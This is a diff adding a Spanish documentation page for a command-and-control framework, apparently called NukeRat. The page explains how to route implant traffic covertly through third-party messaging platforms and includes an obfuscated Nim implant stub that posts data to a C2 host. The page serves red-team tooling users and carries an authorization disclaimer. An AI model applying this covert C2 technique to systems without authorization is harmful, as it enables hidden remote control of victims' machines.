@@ -1,0 +1,145 @@
+---
+title: Canales personalizados
+---
+
+import { Callout } from '@/ui/custom/callout';
+import customChannelMap from '@/assets/img/tutorial/map.png';
+import { ImageZoom } from 'fumadocs-ui/components/image-zoom';
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+
+Si quieres un canal de comunicación a través de servicios externos como Telegram, Discord y similares, esta es la página que te interesa.
+
+<Callout
+  type="warning"
+  title="Plataformas de terceros"
+  className="rounded-[6px] border-red-500/70 bg-red-950/50 shadow-red-950/20 [&_svg]:text-red-400 [&_.text-fd-muted-foreground]:text-red-100/95 [&_p.font-medium]:text-red-200"
+>
+  El proyecto NukeRat no influye, recomienda ni promueve el uso de plataformas de terceros como command and control sin autorización explícita del operador y pleno cumplimiento de la legislación aplicable. Los nombres de la lista anterior son solo ejemplos ilustrativos, no respaldo ni orientación del proyecto.
+</Callout>
+
+## Cómo funciona
+
+Para construir un canal personalizado, ayuda explicar rápidamente cómo encajan las piezas. Básicamente tiene tres pilares:
+
+1. Listener HTTP
+2. Implant con un canal personalizado
+3. Script personalizado
+
+Juntos transportan la comunicación entre el implant y el team server sin que el implant haga ninguna petición excepto al servicio de terceros autorizado que hayas elegido.
+
+El flujo debería parecerse al diagrama siguiente:
+
+<ImageZoom src={customChannelMap} alt="Flujo de canal personalizado" className="tutorial_img" />
+
+### ( 2 ) Listener
+
+Necesitas un listener HTTP configurado. Puedes usar la API del team server en su lugar, pero para mantener las cosas claras y prácticas usaremos un listener HTTP en los ejemplos.
+
+### ( 3 ) Script personalizado
+
+Este es uno de los pasos más importantes. Escribes un script que habla con el servicio de terceros que elegiste y con el listener, haciendo una especie de «traducción».
+
+### ( 4 ) Plataforma de terceros
+
+Es la plataforma que elegiste como canal de comunicación externo.
+
+### ( 5 ) Implant
+
+Un implant que ya incluye lógica de comunicación personalizada desde el momento de la compilación.
+
+## Flujo de comunicación
+
+Ahora que tienes una idea de la estructura, es más fácil recorrer un escenario con una plataforma de mensajería externa, como un chat similar a Telegram.
+
+  <Steps>
+    <Step>
+      Se envía un comando `whoami` a la cola.
+    </Step>
+    <Step>
+      El script personalizado ejecuta un bucle que habla con el listener cada 5 segundos para obtener comandos. Cuando encuentra uno, envía una petición al servicio externo, algo como:
+
+      ```
+      input | 938192 | whoami
+      ```
+    </Step>
+    <Step>
+      En el servicio externo aparece un mensaje con ese mismo contenido.
+    </Step>
+    <Step>
+      El implant ya tiene sus propias peticiones a ese servicio externo, con las API keys y tokens necesarios para autenticarse y enviar tráfico. En cada petición comprueba si hay un comando esperándole. Cuando encuentra uno, ejecuta el comando.
+
+      Luego envía una petición al servicio externo con el resultado, algo como:
+
+      ```
+      output | 938192 | whoami | root
+      ```
+    </Step>
+    <Step>
+      En uno de sus bucles el script personalizado ve esa salida y envía una petición al listener como si fuera el propio implant, siguiendo el formato de comunicación de [Implant API](/docs/rest-api/implants). Después elimina ese contenido del servicio externo.
+    </Step>
+    <Step>
+      El listener recibe la petición, la trata como tráfico de implant y completa el comando.
+    </Step>
+  </Steps>
+
+## Script personalizado
+
+Aquí no hay mucho misterio. Eres responsable de un script que hace bucle, observa el servicio externo que elegiste y reenvía el tráfico al listener. Según tus objetivos tendrás más complejidad aquí, especialmente al fragmentar entradas o salidas muy grandes.
+
+## Canal personalizado
+
+Como se mencionó antes, el implant debe compilarse con lógica de comunicación para el servicio que elegiste, lo que implica escribir algo personalizado y a veces empezar desde cero.
+
+Para llegar al canal personalizado durante la creación del implant, abre **Command and control** y selecciona **Custom channel** bajo CHANNEL.
+
+Justo después aparece un área de texto con un stub de código que se parece a esto:
+
+```nim
+
+# imports...
+
+var customServerHost = obf("http://192.168.15.10:9090/")
+const delaySeconds = 2
+customCookies = toTable([
+  (obf("session"), obf("example")),
+  (obf("token"), obf("example")),
+])
+customHeaders = toTable([
+  (obf("User-Agent"), obf("Mozilla/5.0")),
+  (obf("X-Custom-Header"), obf("example")),
+])
+
+proc httpPost(
+    url, payload: string;
+    cookies: Table[string, string];
+    headers: Table[string, string]
+): tuple[code: uint16, body: string] =
+  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
+  for key, value in headers:
+    pairs.add((key, value))
+  var cookieParts: seq[string] = @[]
+  for key, value in cookies:
+    cookieParts.add(key & obf("=") & value)
+  if cookieParts.len > 0:
+    pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
+  let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
+  (code: r.code, body: r.body)
+
+# Rest of the code...
+```
+
+No es más que la comunicación HTTP por defecto escrita en forma procedural para que puedas personalizarla más fácilmente. Puedes cambiar esta lógica según lo que necesites.
+
+En casos más complejos puedes añadir helpers extra para fragmentación, cifrado, etc.
+
+## Relay y pivoting
+
+Esta parte es molesta de afinar pero necesaria. Junto a la pestaña **Implant routine** verás **Relay forwarder**, que es la lógica usada por el relay saliente.
+
+Cuando configuras un relay, siempre hay un último relay que envía ese tráfico al team server, y ese tráfico debe dar forma a una petición HTTP y JSON. Este bloque de código es responsable de ello. Así que si quieres relay junto con canal personalizado, también hay que ajustarlo.
+
+Para tu alivio, a menudo puedes adaptar la misma lógica de **Implant routine** en **Relay forwarder**.
+
+## Pruebas tras pruebas
+
+Sí, construir un canal personalizado puede ser tedioso y complejo, por lo que recomendamos probar toda la lógica antes de confiar en ella en producción. En cada compilación del implant obtienes la excepción cuando tu lógica es incorrecta, lo que facilita mucho el desarrollo.
